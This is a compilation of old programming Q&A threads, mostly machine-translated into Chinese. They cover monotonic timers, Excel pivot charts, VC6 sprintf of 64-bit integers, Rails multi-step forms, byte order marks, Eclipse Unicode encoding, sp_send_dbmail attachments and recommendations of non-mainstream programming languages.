On UNIX, clock/getrusage refer to system time, whereas using function such as gettimeofday to sample timestamps has the same problem as using clock on windows.

I'm not really interested in precision, and I've hacked a solution by having a half a second resolution timer spinning in the background countering the clock skews when they happen (if the difference between the sampled time and the expected exceeds 1 second i use the expected timer for the new baseline) but I think there must be a better way.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T15:26:34.977

我想你总是可以启动某种计时器。例如在 Linux 下，一个线程会有这样的循环：

```
static void timer_thread(void * arg)
{
        struct timespec delay;
        unsigned int msecond_delay = ((app_state_t*)arg)->msecond_delay;

        delay.tv_sec = 0;
        delay.tv_nsec = msecond_delay * 1000000;

        while(1) {
                some_global_counter_increment();
                nanosleep(&delay, NULL);
        }
} 
```

如果`app_state_t`您存储变量，您选择的应用程序结构在哪里。如果你想防止篡改，你需要确保没有人杀死你的线程

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-01T17:58:58.303

对于 POSIX，使用`clock_gettime()`with `CLOCK_MONOTONIC`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T11:56:11.250

我不认为你会找到一种跨平台的方式来做到这一点。

在 Windows 上，您需要的是[GetTickCount](http://msdn.microsoft.com/en-us/library/ms724408.aspx)（或者可能是高分辨率计时器的[QueryPerformanceCounter](http://msdn.microsoft.com/en-us/library/ms644904.aspx)和[QueryPerformanceFrequency ）。](http://msdn.microsoft.com/en-us/library/ms644905.aspx)我在 Linux 上没有这方面的经验，但在谷歌上搜索给了我[clock_gettime](http://www.linuxmanpages.com/man3/clock_gettime.3.php)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T12:37:04.927

挂钟时间可以通过**time()**调用来计算。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-10-14T10:37:21.067

If you have a network connection, you can always acquire the time from an NTP server. This will obviously not be affected in any the local clock.

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-10-14T13:45:43.777

Linux 上的 /proc/uptime 维护系统已启动的秒数（以及空闲的秒数），它应该不受时钟更改的影响，因为它由系统中断（jiffies / HZ）维护. 也许Windows有类似的东西？

# excel - Excel 时间表

> ID：200667
> 
> 赞同：1
> 
> 时间：2008-10-14T10:31:57.100
> 
> 标签：excel, charts

我有以下格式的一些数据：

工资
代码及时

1690 09:03:00
1690 09:13:00
1690 09:07:00
1691 08:48:00
1691 08:52:00
1691 08:50:00
1691 08:54:00
1691 08:46:00
1691 09 :28:00
1691 08:59:00
1691 08:53:00
1691 09:02:00
1693 08:57:00
1693 09:01:00
1693 08:54:00
1693 09:22:00
1693 09:16 :00
1693 08:58:00
1693 09:03:00
1693 09:01:00
1693 09:02:00
1693 09:44:00
1885 09:28:00
1885 09:04:00
1885 09:20:00
1885 08:57:00

所以它大约有 2000 行我需要绘制一个折线图，它将每个工资代码的 intime 绘制为趋势，单独的工资代码用单独的行。有没有一种自动化的方法来做到这一点？请注意，工资代码每天重复。所需的趋势是针对每个工资代码，而不是逐行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T12:57:39.003

它可以在没有编程的情况下完成，但是您需要添加一点信息才能使其有意义 - 每个条目的日期或序列号。然后您将能够绘制：

1.  工资代码：系列
2.  日期或序列号：x 轴
3.  In Time：值/y轴

最简单的方法是使用数据透视图向导：

*   选择（现在）3 列并选择“数据|数据透视表和数据透视图报告..”
*   选择数据透视图类型
*   单击向导完成...您应该结束原始图表页面
*   右键图表是，选择“图表类型”并更改为“线”类型
*   从“数据透视表字段列表”中，选择：
    *   日期或序列号 - 添加到“类别轴”
    *   工资代码 - 添加到系列轴
    *   及时 - 添加到数据区
*   默认情况下，它将绘制“时间计数”：需要更改此
    *   右键单击“时间计数”字段按钮小部件
    *   选择“格式化数据透视图字段”
    *   更改为总和、平均值、最大值或最小值（任何代表实际数据的值 - 它仅适用于一个值，因此聚合函数很好）
*   现在你的图表线应该没问题，但 y 轴只是一个无意义的值。
    *   右键单击 y 轴并选择“格式轴”
    *   转到“数字”选项卡并将格式更改为“时间”

瞧！每个工资代码的行，每天绘制“及时”趋势

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T11:33:05.790

我不认为有一个简单的出路..

我在 5 分钟内能做的最好的事情就是翻转列，选择并创建一个 XY 散点图。

它仍然不会为每个员工或个别行提供不同的点颜色

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T11:39:23.030

我不相信有一种自动化的方法可以做到这一点，但可能你可以生成第三列，其中包含时间和任意基准时间（比如上午 12:00 或 00:00）之间的增量。然后绘制增量图表。

# performance - How does Google Desktop Search manage to stay light and fast?

> ID：200673
> 
> 赞同：2
> 
> 时间：2008-10-14T10:34:26.720
> 
> 标签：performance, algorithm, google-desktop-search

I always wondered what different methods Google Desktop Search is using so that it uses least CPU and memory while indexing a computer containing more 100,000 files on an average.

In just few hours it has indexed the whole system and I did not see it eating up my CPU, memory etc.

If any of you have done some research, please do share.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T11:42:39.653

诀窍很简单：它开始工作，然后很快停止，只是坐在记忆中，什么都不做。当然，它完全没用，但至少，它保持轻便和快速。抱歉，无法抗拒 :-) 我切换到 Windows Search 4.0，对此我感到非常高兴。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T11:20:19.670

它不...

我将它安装在一台计算机上，并迅速将其删除，因为它具有侵入性（尽管可能可以配置）并且很饿（尤其是在低端 PC 上）。

它现在安装在我附近的笔记本电脑上，如果我将它与我永久运行的几个小实用程序（SlickRun、CLCL、我的 AutoHotkey 脚本......）进行比较，它使用的 CPU 是其 CPU 的 10 倍以上和 5 到 20 倍他们的记忆。两次，因为由于某种原因，我有一个实例运行另一个实例，加上 ToolbarNotifier（不那么饿）。
即使是趋势科技防病毒软件也使用更少的内存和 CPU。

也许当我得到一台更现代的、有大量内存的 PC 时我会再试一次，但现在我对一些 grep 实用程序感到满意，即使它们速度较慢。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T11:46:45.513

看看磁盘使用情况。如果您构建许多键/索引，您将使用大量磁盘空间并且搜索会很快。

例如; 30 gig 驱动器已使用 75%。3.6 gig 用于 2 个 Google 桌面实例。（漫游配置文件很烂）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T11:54:38.757

一旦它完成了初始索引并将其写入磁盘，它就不需要任何东西了。

使用索引进行搜索将需要很少的资源，唯一需要的就是索引新的或修改过的文件。

# c - 带有 unsigned long long 和 sprintf 的 VisualC++ 6.0

> ID：200676
> 
> 赞同：4
> 
> 时间：2008-10-14T10:36:26.263
> 
> 标签：c, visual-c++-6

我想在 Visual C++ 6.0（纯 C）中 sprintf() 一个 unsigned long long 值。

```
char buf[1000]; //bad coding 
unsigned __int64 l = 12345678; 
char t1[6] = "test1"; 
char t2[6] = "test2"; 
sprintf(buf, "%lli, %s, %s", l, t1, t2); 
```

给出结果

```
12345678, (null), test1 
```

`test2`（未打印的手表）

它给出`l = 123456789012345`了一个异常句柄

有什么建议么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T11:19:29.373

要在 Visual C++ 6.0 中打印一个`unsigned __int64`值，您应该使用`%I64u`, 而不是`%lli`（请参阅 MSDN 上的[此页面](http://msdn.microsoft.com/en-us/library/aa272936%28VS.60%29.aspx)）。`%lli`仅在 Visual Studio 2005 及更高版本中受支持。所以，你的代码应该是：

```
sprintf(buf, "%I64u, %s, %s", l, t1, t2); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T11:13:52.270

printf 使用省略号传递变量参数列表。您看到的 (null) 是 long long 的第二部分，恰好都是 0 位。将其设置为 1<<60+1<<30 会导致崩溃，因为 1<<60 部分被解释为 char*。

正确的解决方案是将数字分解为 10 位的三个部分，“verylongvalue % 10000000000”“(verylongvalue/10000000000) % 10000000000”“verylongvalue/100000000000000000000”。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-10-14T10:43:26.420

显然，您没有分配`additionaltext`必要的`char *`（字符串）。请注意，`long int`已处理 ，复制了逗号，并且仅`%s`生成了`(null)`.

# ruby-on-rails - Rails 中的多页表单

> ID：200686
> 
> 赞同：5
> 
> 时间：2008-10-14T10:39:36.520
> 
> 标签：ruby-on-rails, model-view-controller, validation, forms

我有一个非常复杂的模型，其中包含许多字段、`has_many`关联、由`image_column`等添加的图像......

新对象将通过多页表单添加（8 个步骤） - 我应该如何完成这些步骤之间的验证和传播？

我认为`validation_group`对于定义每个步骤的验证可能很有用，那么整体设计呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T13:28:06.417

对于整体设计，您可能希望研究 Presenter 层的概念（Jay Fields 在他的博客条目[Rails: Presenter Pattern](http://blog.jayfields.com/2007/03/rails-presenter-pattern.html)中定义它）作为一种在处理复杂/多个模型时保持控制器精简和视图愚蠢的方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-11T21:54:18.317

您可以有一系列方法，例如`step_1`, `step_2`，并且每个方法都检查是否已提交上一步的必要数据。您可以将数据存储在会话中，例如，步骤 3 仍然可以访问在步骤 1 中收集和解析的所有数据。在最后一步中，将您存储在会话中的所有数据加上数据从倒数第二步开始使用，并在数据库中创建一个新行或您正在收集数据的任何内容。如果用户搞砸了一个步骤，将他们重定向到上一步，并使用他们填写的数据为他们填写表格；例如，如果用户搞砸了第 2 步并提交了导致第 3 步的表单，则在您的`step_3`方法中发现问题，将用户重定向到`step_2`方法，并确保步骤 2 中的表单元素已预先填写。

如果您不想在会话中存储数据，您可以在用户提交第 1 步后创建一个新的数据库行，并在每个后续步骤中收集新数据时更新该行中的字段。您可以在行上有一些“完成”标志，最初将其设置为 0，然后在用户成功完成所有步骤后将其设置为 1。

您还可以允许用户转到前面的步骤（例如，让用户在第 5 步时返回第 3 步）。

假设您的第一步有一个包含“名称”和“电子邮件”字段的表单。在您的`step_2`方法中，您应该验证`params[:name]`并且`params[:email]`已通过并且有效。将它们存储在会话或数据库行中，无论您选择什么。然后在第 2 步中，您有一个包含“年龄”和“性别”字段的表单。在您的`step_3`方法中，您应该验证`params[:age]`and`params[:gender]`是否通过并且是有效的，并且您还需要确保用户已经完成了步骤 1，以防止用户输入 URL 直接访问步骤 3。等等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-01T23:41:05.517

```
class Campaign < ActiveRecord::Base
    with_options(:if => lambda { |campaign| campaign.on_or_past_step(:spam_can) }) do |spam_can|
      spam_can.validates_associated  :spam_can
      spam_can.validates_presence_of :spam_can
    end
  def on_or_past_step
   :
   :
  end
end 
```

这是一项正在进行的工作，但我觉得我走在正确的轨道上。我正在使用[AASM](http://github.com/rubyist/aasm/tree/master)状态来确定要运行哪些验证。我还没有弄清楚路线应该如何工作，因为我所讨论的模型是一种资源。例如，哪组字段应该是编辑操作？

# file - 如何为 Unicode 文件设置字节顺序标记？

> ID：200689
> 
> 赞同：3
> 
> 时间：2008-10-14T10:41:50.917
> 
> 标签：file, unicode, utf-8, byte-order-mark

我知道这不是一个“真正的”编程问题。但是，它与编程有关，所以我还是要设置它。我有一个需要测试的程序，它读取文件的字节顺序标记以查看它是 utf-8 还是 utf-16。我的问题是我找不到允许我设置字节顺序标记的程序/文本编辑器。谁能告诉我如何在文本文件中设置它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T10:46:29.300

如果您需要绝对确定发生了什么，请使用二进制十六进制编辑器或从程序中写出二进制文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T11:03:25.787

有一个相当不错的程序叫做[BabelPad](http://www.babelstone.co.uk/Software/BabelPad.html)。它不仅会设置 BOM，我相信它还会告诉你是否设置了。您也可以在 .Net 中以编程方式执行此操作。[MSN](http://msdn.microsoft.com/en-us/netframework/aa569610.aspx)上有一个很好的常见问题解答。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T10:50:51.570

[Ultra Edit](http://www.ultraedit.com/)或[Notepad++](http://notepad-plus.sourceforge.net)都应该能够做到，并且也可以编辑原始十六进制（通过带有 np++ 的插件）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T10:52:49.990

如果你有它，你应该能够在 Visual Studio.NET 中看到和编辑它。

在 Visual Studio 中调出打开文件对话框。单击“打开”按钮上的小三角形，然后选择“打开方式”。现在选择二进制编辑器。

您应该能够编辑文件开头的十六进制值以包含您需要的任何字节顺序模式。

这篇[Wikipedia 文章](http://en.wikipedia.org/wiki/Byte-order_mark)描述了为不同的文件格式（例如 UTF-8 或 UTF-16）设置字节顺序标记所需的内容

# java - 如何在 Java/Eclipse 中使用特殊字符

> ID：200691
> 
> 赞同：26
> 
> 时间：2008-10-14T10:42:00.573
> 
> 标签：java, eclipse, unicode, encoding, cp1252

如何在 Java/Eclipse 中使用/显示 ♥、♦、♣ 或 ♠ 等字符？

当我尝试直接使用它们时，例如在源代码中，Eclipse 无法保存文件。

我能做些什么？

编辑：如何找到 unicode 转义序列？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2008-10-14T10:49:01.307

问题是您使用的字符无法以您将文件设置为 (Cp1252) 的编码表示。在我看来，你基本上有两个选择：

选项 1.**更改编码。** [根据 IBM](http://publib.boulder.ibm.com/infocenter/eruinf/v2r1m1/index.jsp?topic=/com.ibm.iru.doc/concepts/cirerwp.htm)，您应该将编码设置为 UTF-8。我相信这会解决你的问题。

> *   将全局文本文件编码首选项 Workbench > Editors 设置为“UTF-8”。
> *   如果需要 UTF-8 以外的编码，请在单个文件上设置编码，而不是使用全局首选项设置。为此，请使用“文件”>“属性”>“信息”菜单选项来设置单个文件的编码。

选项 2.**删除“Cp1252”字符编码不支持的字符。**[您可以使用Unicode 转义序列](http://en.wikibooks.org/wiki/Java_Programming/Syntax/Unicode_Escape_Sequences)(\uxxxx)替换不受支持的字符。虽然这可以让您保存文件，但它不一定是最佳解决方案。

对于您在问题中指定的字符，这里是 Unicode 转义序列：

```
♥ \u2665
♦ \u2666
♣ \u2663
♠ \u2660 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-02-12T20:13:39.873

在 Eclipse 中：

1.  转到窗口 -> 首选项 -> 常规 -> 工作区 -> TextFileEncoding
2.  将其设置为 UTF-8

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-10-14T10:56:35.067

可以通过在eclipse中设置编码来解决：

第一种方式：

在菜单中选择**文件-->属性**，然后在**“文本文件编码”**部分：选择其他单选，从组合中选择 UTF-8 ->最后单击确定按钮

第二种方式：

右键单击特定文件（例如 Test.java）-> **Properties**。在**文本文件编码**部分：选择其他单选，从组合中选择 UTF-8 -> 最后单击确定按钮

第三种方式：

如果您想对所有项目进行此更改，请转到**Window-->Preferences--> General-> Workspace**。在**文本文件编码**部分：选择其他单选，从组合中选择 UTF-8 -> 最后单击确定按钮

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T10:45:14.590

要么将您的编码更改为可以处理的编码，例如 UTF-8，要么找到相关的 Unicode 编号并使用 \uxxxx 转义序列来表示它。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T11:37:41.380

查找 Unicode 转义序列：请参阅这些[Unicode 图表](http://www.macchiato.com/unicode/chart/)。您的角色在杂项中。符号图表，\u2660 及以上。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-10-29T09:50:19.960

扩展一点@Joe Lencioni 的回答

您可以使用 AnyEdit Eclipse 插件（可从 Eclipse 市场安装）轻松地将 Unicode 文本转换为 Java Unicode 转义：

*   选择非 ASCII 字符的字符/文本
*   右键点击
*   转换 > 到 Unicode 表示法

一个小警告是 AnyEdit 想要首先保存文件，这显然是 Eclipse 不允许的，直到您修复您的文本。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-06-21T10:17:38.920

Windows 菜单 -> 首选项 -> 常规（展开） -> 工作区（单击它）。查找“文本文件编码”框。默认为“Cp1252”。更改收音机以选择其他并从组合框中选择“UTF-8”。

# sql-server-2005 - 如何使用 sp_send_dbmail 发送 VARBINARY 列的内容？

> ID：200704
> 
> 赞同：0
> 
> 时间：2008-10-14T10:48:03.930
> 
> 标签：sql-server-2005, sp-send-dbmail

我有一些文件存储在 SQL Server 2005 表的`VARBINARY(MAX)`列中。我需要按计划将这些文件通过电子邮件发送给用户，虽然我可以编写一个 C# 服务来提取和发送电子邮件，但这`sp_send_dbmail`对于我的目的来说似乎是完美的。我正在使用的代码如下所示：

```
EXEC msdb.dbo.sp_send_dbmail
@profile_name = 'SQL Mail Profile',
@recipients = 'emailaddress',
@query = 'set nocount on; select CAST(content AS varchar(MAX)) from files where fileid=''xxx''' ,
@subject = 'Random File',
@attach_query_result_as_file = 1,
@query_attachment_filename = 'random file.pdf',
@query_result_no_padding = 1,
@query_result_header = 0,
@query_no_truncate = 1; 
```

当我直接使用查询时，我得到了 PDF 文件的文本表示形式，但是当我使用上面的代码时，我得到了文件的截断版本（总是 792 字节）。这似乎表明某处有一个设置可以控制它，但是尽管我可以找到控制文档大小的设置，但它们都比我要邮寄的文件大得多！

任何人以前看过这个，或者有任何想法在哪里看？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T11:41:25.507

以下教程可能会涉及您错过的内容：[http ://www.mssqltips.com/tip.asp?tip=1438](http://www.mssqltips.com/tip.asp?tip=1438)

# programming-languages - 最有趣的非主流语言？

> ID：200721
> 
> 赞同：43
> 
> 时间：2008-10-14T10:59:06.107
> 
> 标签：programming-languages, language-design

我对编译器、解释器和语言感兴趣。

你知道的最有趣但被遗忘或未知的语言是什么？更重要的是，为什么？

我对编译、解释和 VM 语言都感兴趣，但对Whitespace 或 BF 等深奥的语言*不感兴趣。*
当然，开源将是一个加分项，因为我计划学习并希望从中学习。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-14T11:11:36.380

我喜欢编译器和虚拟机，也喜欢 Lua。

Lua 不像许多其他脚本语言那样得到很好的支持，但从像你这样的心态来看，我相信你也会爱上 Lua。我的意思是它就像 lisp，（据我所知，lisp 可以做任何事情），具有 ADA 的许多主要功能，而且它内置了元编程，函数式编程和面向对象编程足够松散，可以制作任何类型您可能想要的领域语言。除了 VM 的代码是简单的 C 代码之外，这意味着即使在那个级别上，您也可以轻松地深入了解它。

（而且它是开源的 MIT 许可证）

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2008-10-14T12:47:17.310

我是 D 编程语言的粉丝。这是[来自官方网站的](http://www.digitalmars.com/d/)[维基百科文章](http://en.wikipedia.org/wiki/D_programming_language)和介绍。

维基百科文章的一些片段：

> D 编程语言，也简称为 D，是 Digital Mars 的 Walter Bright 提出的一种面向对象、命令式、多范式的系统编程语言。它起源于对 C++ 的重新设计，但即使它主要受该语言的影响，它也不是 C++ 的变体。D 重新设计了一些 C++ 特性，并受到其他编程语言中使用的概念的影响，例如 Java、C# 和 Eiffel。稳定版 1.0 于 2007 年 1 月 2 日发布。实验版 2.0 于 2007 年 6 月 17 日发布。

关于特点：

> D 的设计是从实际 C++ 使用中吸取的经验教训，而不是从理论的角度。尽管它使用了许多 C/C++ 概念，但它也丢弃了一些概念，因此并不严格向后兼容 C/C++ 源代码。它通过实现契约式设计、单元测试、真正的模块、垃圾收集、第一类数组、关联数组、动态数组、数组切片、嵌套函数、内部类、闭包[2]、匿名函数、编译时函数执行、延迟评估并具有重新设计的模板语法。D 保留了 C++ 进行低级编码的能力，并增加了对集成内联汇编器的支持。C++ 多重继承被带有接口和 mixin 的 Java 风格的单一继承所取代。D的声明，

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2008-10-14T11:00:53.623

我想很大程度上取决于您所说的“非主流”是什么意思。

[lisp](http://en.wikipedia.org/wiki/Lisp_programming_language)会算作非主流吗？

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2008-10-14T11:23:52.470

我建议看看 Erlang——它最近受到了一些媒体的关注，所以一些学习资源非常好。如果您使用过 OO 和/或过程语言，Erlang 肯定会以新的和令人兴奋的方式改变您的想法。

Erlang 是一种纯函数式语言，对并发、分布式和容错程序提供了基础支持。它有许多有趣的特性，包括变量根本不是真正的变量——它们一旦声明就不能更改，实际上可以更好地理解为一种模式。

博客圈中有一些关于在 Erlang 平台 (OTP) 之上构建以及对 Ruby 等其他语言的机器支持的讨论——Erlang 将成为一种用于运行并发应用程序的虚拟机，这将是一个非常令人兴奋的可能性。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-10-14T12:31:40.587

我最近爱上了[Ocaml](http://www.soton.ac.uk/~fangohr/software/ocamltutorial/lecture1.html)和一般的函数式语言。

例如，Ocaml 提供了所有可能世界中最好的。您获得的代码可以编译为与 C 一样快的可执行本机机器语言，或通用可移植字节码。你会得到一个解释器来为开发带来 REPL 速度。您将获得函数式编程的所有力量，以生成完全正交的结构、深度递归和真正的多态性。最重要的是对面向对象的支持，在已经提供了 OOP 所承诺的一切（封装、模块化、正交函数和多态可回收性）的函数式语言的上下文中，这意味着 OOP 被迫实际证明自己。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2008-10-14T11:16:08.040

Smalltalk [（参见此处链接的讨论）](https://stackoverflow.com/questions/149042/would-you-start-learning-smalltalk#149323)。有点像动态语言的祖父（Lisp 和 SNOBOL 可能除外）。使用 Java 和现在的 Python 和 Ruby 等较新的语言非常好用，但遗憾的是被它践踏了。

* * *

## 回答 #7

> 赞同：10
> 
> 时间：2008-10-14T11:16:46.087

FORTH 是一种为早期 CPU 上的低级代码设计的语言。它最显着的特点是基于 RPN 堆栈的数学运算。早期 HP 计算器上使用的数学类型相同。例如 1+2+3+4= 会写成 1, 2, 3, 4, + , +, +

* * *

## 回答 #8

> 赞同：8
> 
> 时间：2008-10-14T12:17:10.473

Haskell 和 REBOL 都是令人着迷的语言，原因截然不同。

Haskell 可以真正让开发人员大开眼界，其中包含 monad、部分应用程序、模式匹配、代数类型等概念。对于好奇的程序员来说，这是一个大杂烩。

REBOL 也毫不逊色。一开始看起来很简单，但是当您开始深入研究上下文、PARSE 方言和 Bindology 等概念时，您会意识到这不仅仅是表面上的东西。REBOL 的好处是它比 Haskell 更容易上手。

我无法决定我更喜欢哪个。

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2008-10-14T11:04:02.120

[Boo](http://boo.codehaus.org)以 .NET 框架为目标并且是开源的。灵感来自 Python。

* * *

## 回答 #10

> 赞同：7
> 
> 时间：2008-10-14T12:33:19.320

试试[colorForth](http://colorforth.com/cf.html)。

* * *

## 回答 #11

> 赞同：7
> 
> 时间：2008-10-14T12:42:51.610

PROLOG 是一种基于规则的语言，具有回溯功能。您可以生成非常易于阅读（如在 prosa 中）的代码。

* * *

## 回答 #12

> 赞同：6
> 
> 时间：2008-10-14T12:56:01.550

我发现约束语言很有趣，但很难知道什么是遗忘或未知。以下是我所知道的一些语言（这当然不是任何类型的详尽列表）：

*   [Ciao](http://www.clip.dia.fi.upm.es/Software/Ciao/)、[YAP](http://www.dcc.fc.up.pt/~vsc/Yap/)、[SWI-Prolog](http://www.swi-prolog.org/)和[GNU Prolog](http://www.gprolog.org/)都是 Prolog 的实现。我认为它们都是开源的。Ciao、gnu prolog 和可能的其他一些也支持其他约束类型，这在 Prolog 实现中很常见。例如整数规划。
*   [据我了解， Mozart](http://www.mozart-oz.org/)和[Mercury](http://www.mozart-oz.org/)都是替代逻辑编程语言。
*   [Alice](http://www.ps.uni-sb.de/alice/)更属于 ML 系列，但支持使用[GECODE](http://www.gecode.org/) C++ 库的约束编程。

有点跑题了。。。。

*   [Maude](http://maude.cs.uiuc.edu/)是一个有趣的术语重写语言。
*   [HOL](http://hol.sourceforge.net/)和[COQ](http://coq.inria.fr/)都是语言社区常用的机械化证明系统。

[Lambda-the-Ultimate](http://lambda-the-ultimate.org/)是谈论和了解更多有关编程语言的好地方。

* * *

## 回答 #13

> 赞同：5
> 
> 时间：2008-10-14T12:58:23.667

我不得不说 Scheme，尤其是在它的[R6RS](http://www.r6rs.org)化身中。

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2008-10-14T12:32:08.493

Modula-2 是我发现最有趣的非主流语言。看起来很主流，但不像我们习惯的那样工作。从 Pascal 继承了很多东西，但又足够不同以提供有趣的学习可能性。

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2008-10-22T10:35:44.387

[在http://www.iolanguage.com/](http://www.iolanguage.com/) 或 Lisaac 上查看 Io ： [https](https://gna.org/projects/isaac/) ://gna.org/projects/isaac/ 或 Self 在：[http](http://self.sourceforge.net/) ://self.sourceforge.net/ 或 Sather（现在绝对被遗忘）或埃菲尔[http://www.eiffel.com](http://www.eiffel.com)

为什么这里有几个原因。Io 绝对简约，甚至没有“控制流元素”作为语法实体。Lisaad 是 Eiffel 的后续产品，对 AFAIKT 进行了许多简化。Self 是 Smalltalk 的后续产品，Io 也从 Self 那里获得了很多。基本的事情是已经放弃了类和对象之间的区别。Sather 是对 Eiffel 的回应，它有一些其他规则和对函数式编程的更好支持（从一开始就）。

Eiffel 绝对是静态类型的 OO 语言的标志。Eiffel 是第一个支持按合同设计、泛型（又名模板）和处理继承的最佳方法之一的语言。它曾经是并且现在仍然是更简单的语言之一。我为埃菲尔找到了最好的图书馆.....

它的创造者只有一个问题，他没有接受其他对OO领域的贡献......

问候

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2008-10-14T11:13:51.350

我最近从[这个问题中](https://stackoverflow.com/questions/63241/what-is-the-strangest-programming-language-you-have-used)[了解到](https://stackoverflow.com/questions/63241/what-is-the-strangest-programming-language-you-have-used#64476)[Icon](http://en.wikipedia.org/wiki/Icon_(programming_language))的存在。从那以后，我用它来回答几个问题。( [1](https://stackoverflow.com/questions/132501/how-do-i-sort-a-list-of-integers-using-only-one-additional-integer-variable#133080) , [2](https://stackoverflow.com/questions/23930/factorial-algorithms-in-different-languages#100199) , [3](https://stackoverflow.com/questions/124671/picking-a-random-element-from-a-set#124942) , [4](https://stackoverflow.com/questions/166899/language-showdown-convert-string-of-digits-to-array-of-integers#167424) )

这很有趣，因为它的评估策略 - 它是我所知道的唯一支持回溯的命令式语言。它为许多事情提供了一些简洁的代码:)

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2008-10-14T12:17:45.107

学习任何需要你重新思考编程习惯的语言都是必须的。一个明确的标志是您浏览语言核心（而不是库）文档的速度。快速在这里意味着没有结果。

我的短名单是，按照我的曝光顺序以及我从中学到的概念：

*   汇编，C：非常适合学习指针及其算术。
*   C++：与 C 相同，只是介绍了泛型，只要你能忍受令人难以置信的冗长语法。
*   Ruby/Lua：脚本语言，动态类型，为现有的 C 库编写绑定。
*   Python/C#/Java：跳过，这些语言在我看来是对源自其他地方的概念的重新混合，具有巨大的标准库。当然，整个软件包都很好，但是您不会在这里学习新概念。
*   OCaml：类型推断正确，部分应用，编译器推断通用性，默认不变性，如何优雅地处理空值。
*   Haskell：默认是惰性的，monads。

我的 €.02。

* * *

## 回答 #18

> 赞同：3
> 
> 时间：2009-06-23T02:12:16.300

我不敢相信 Logo 就这么被遗忘了。好的，这是徽标。有点像 lisp，但语法略丑。尽管在 Logo 中使用列表，但会遇到令人愉快的命名为 'butfirst' 和 'butlast' 的操作。=P

* * *

## 回答 #19

> 赞同：3
> 
> 时间：2009-10-02T20:21:03.997

毫升。学习和使用它会迫使你以不同的方式思考编程问题。在大多数情况下，它也会给予一种耐心。最多。

* * *

## 回答 #20

> 赞同：3
> 
> 时间：2009-12-01T22:52:33.987

[去](http://golang.org/)怎么样？它是全新的，所以它是未知的并且不是主流（还）。

这很有趣，因为语法看起来就像将 C 和 pascal 放入 jar 并让它们战斗之后发生的情况。

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2008-10-14T13:17:09.620

好吧，曾经它被称为[MUMPS](http://en.wikipedia.org/wiki/MUMPS)，但现在它被称为 InterSystems Caché [http://www.intersystems.com/cache/](http://www.intersystems.com/cache/)

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2008-10-19T07:51:08.227

第一个答案 - 方案。它的使用不是很广泛，但绝对看起来像是一种可靠的语言，特别是考虑到 DrScheme 的健壮性（它实际上将 Scheme 程序编译为本机二进制代码）。

在那之后 - Haskell 非常有趣。它是一种正确执行惰性求值的语言，其后果令人难以置信（包括诸如斐波那契数列的单行定义之类的事情）。

走向更主流，Python 仍然没有真正被商业界广泛接受，但它绝对应该是，现在......

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2008-10-30T18:15:24.760

Ken Kahn 的 ToonTalk，一种具有核心理论基础的卡通语言： [http ://www.toontalk.com/](http://www.toontalk.com/)

Prograph： [http](http://en.wikipedia.org/wiki/Prograph) ://en.wikipedia.org/wiki/Prograph ... 似乎 Prograph 像 Marten 一样继续存在 ：http: [//andescotia.com/products/marten/](http://andescotia.com/products/marten/)

Self 的 IDE 曾经/现在很美，谈论 Flow（在 Csíkszentmihályi 意义上）......

不过，总的来说，我不得不说 Haskell 是最有趣的，因为它代表了计算方面的潜在进步。

* * *

## 回答 #24

> 赞同：2
> 
> 时间：2009-12-01T22:27:39.053

[动态类型的港口](http://harbour-project.org)。商务应用的绝佳选择。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2008-10-14T13:08:39.747

Scheme 立刻浮现在脑海中，一个更好的 Lisp。

另外，我知道您的问题不符合深奥语言的资格，但请考虑[INTERCAL](http://www.catb.org/~esr/intercal/)。它有滑稽的`COME FROM`运算符（如`GOTO`，但放置在跳转目的地，而不是跳转点）。这个运算符看起来很奇怪，但是我们可以说它的影响在面向方面编程中可以看到吗？在 AOP 中，建议通常在某个外部位置指定，仅查看建议的代码并不总是使控制流清晰。然而，查看建议会告知读者控制来自何处。

